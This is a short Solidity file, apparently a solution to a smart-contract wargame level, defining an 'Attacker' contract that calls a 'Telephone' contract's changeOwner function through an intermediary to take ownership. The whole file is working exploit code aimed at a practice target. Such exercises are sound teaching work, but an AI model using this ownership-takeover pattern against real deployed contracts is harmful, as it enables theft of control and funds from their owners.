// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './telephone.sol';

contract Attacker {
    Telephone victimContract; //Contractname contractvariable

// import a contract
  constructor(address telephoneContractAddress) public {
        victimContract = Telephone(telephoneContractAddress);
    }

  function sendAttackerMessage(address _attackerAddress) external{
    victimContract.changeOwner(_attackerAddress);
  }

}